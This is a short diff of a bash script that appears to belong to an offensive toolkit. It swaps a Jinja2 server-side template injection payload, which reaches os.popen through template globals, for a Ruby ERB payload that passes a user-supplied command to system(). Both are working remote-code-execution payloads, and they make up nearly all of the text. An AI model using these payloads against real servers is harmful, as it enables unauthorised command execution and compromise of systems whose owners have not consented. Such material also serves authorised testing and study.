@@ -1,7 +1,7 @@
 #!/bin/bash
 
 : '
-SSTI - jinja2 rce dump file without built in import, execute code
+SSTI - Ruby template engine (ERB) RCE, execute code
 '
 
 # Generate GUI form items (label, type (optional: default text), name, default (optional))
@@ -12,4 +12,4 @@ generate_form "${CMD_FIELD}"
 
 CMD=${form_data["file"]}
 
-execute_command "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('${CMD}').read() }}"
+execute_command "<%= system(\"${CMD}\") %>"
